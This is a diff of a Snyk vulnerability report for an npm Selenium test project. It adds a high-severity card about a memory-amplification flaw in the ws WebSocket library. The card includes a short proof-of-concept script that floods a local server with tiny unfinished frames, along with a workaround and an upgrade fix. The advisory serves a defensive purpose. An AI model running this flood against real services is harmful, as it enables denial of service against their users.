@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Snyk test report</title>
-  <meta name="description" content="3 known vulnerabilities found in 3 vulnerable dependency paths.">
+  <meta name="description" content="4 known vulnerabilities found in 4 vulnerable dependency paths.">
   <base target="_blank">
   <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
     sizes="194x194">
@@ -492,7 +492,7 @@
               <div class="header-wrap">
                   <h1 class="project__header__title">Snyk test report</h1>
     
-                <p class="timestamp">June 16th 2026, 12:04:54 pm (UTC+00:00)</p>
+                <p class="timestamp">June 17th 2026, 11:29:05 am (UTC+00:00)</p>
               </div>
               <div class="source-panel">
                 <span>Scanned the following path:</span>
@@ -502,8 +502,8 @@
               </div>
     
               <div class="meta-counts">
-                <div class="meta-count"><span>3</span> <span>known vulnerabilities</span></div>
-                <div class="meta-count"><span>3 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>4</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>4 vulnerable dependency paths</span></div>
                 <div class="meta-count"><span>17</span> <span>dependencies</span></div>
               </div><!-- .meta-counts -->
             </div><!-- .layout-container--short -->
@@ -521,6 +521,124 @@
       </section>
     <div class="layout-container" style="padding-top: 35px;">
       <div class="cards--vuln filter--patch filter--ignore">
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Asymmetric Resource Consumption (Amplification)</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ws
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    manuelaklenke-selenium-e2e@1.0.0, selenium-webdriver@4.43.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        manuelaklenke-selenium-e2e@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selenium-webdriver@4.43.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ws@8.20.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ws">ws</a> is a simple to use websocket client, server and console for node.js.</p>
+        <p>Affected versions of this package are vulnerable to Asymmetric Resource Consumption (Amplification) when handling a large number of very small fragments and data chunks. An attacker can cause excessive memory allocation and OOM by sending a high volume of tiny WebSocket frames</p>
+        <h2 id="workaround">Workaround</h2>
+        <p>This vulnerability can be mitigated by lowering the value of the <code>maxPayload</code> option.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-js">import { WebSocket, WebSocketServer } from &#39;ws&#39;;
+        
+        const wss = new WebSocketServer({ port: 0 }, function () {
+          const data = Buffer.alloc(1);
+          const options = { fin: false };
+          const { port } = wss.address();
+          const ws = new WebSocket(`ws://localhost:${port}`);
+        
+          ws.on(&#39;open&#39;, function () {
+            (function send() {
+              ws.send(data, options, function (err) {
+                if (err) return;
+                send();
+              });
+            })();
+          });
+        
+          ws.on(&#39;error&#39;, console.error);
+          ws.on(&#39;close&#39;, function (code, reason) {
+            console.log(`client close - code: ${code} reason: ${reason.toString()}`);
+          });
+        });
+        
+        wss.on(&#39;connection&#39;, function (ws) {
+          ws.on(&#39;error&#39;, console.error);
+          ws.on(&#39;close&#39;, function (code, reason) {
+            console.log(`server close - code: ${code} reason: ${reason.toString()}`);
+          });
+        });
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.</p>
+        <p>Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.</p>
+        <p>One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.</p>
+        <p>When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.</p>
+        <p>Two common types of DoS vulnerabilities:</p>
+        <ul>
+        <li><p>High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, <a href="https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082">commons-fileupload:commons-fileupload</a>.</p>
+        </li>
+        <li><p>Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  <a href="https://snyk.io/vuln/npm:ws:20171108">npm <code>ws</code> package</a></p>
+        </li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ws</code> to version 5.2.5, 6.2.4, 7.5.11, 8.21.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/websockets/ws/security/advisories/GHSA-96hv-2xvq-fx4p">GitHub Advisory</a></li>
+        <li><a href="https://github.com/websockets/ws/commit/2b2abd458a1b647d0b6033bd62a619c36189839a">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-WS-17344547">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
             <h2 class="card__title">Directory Traversal</h2>
             <div class="card__section">
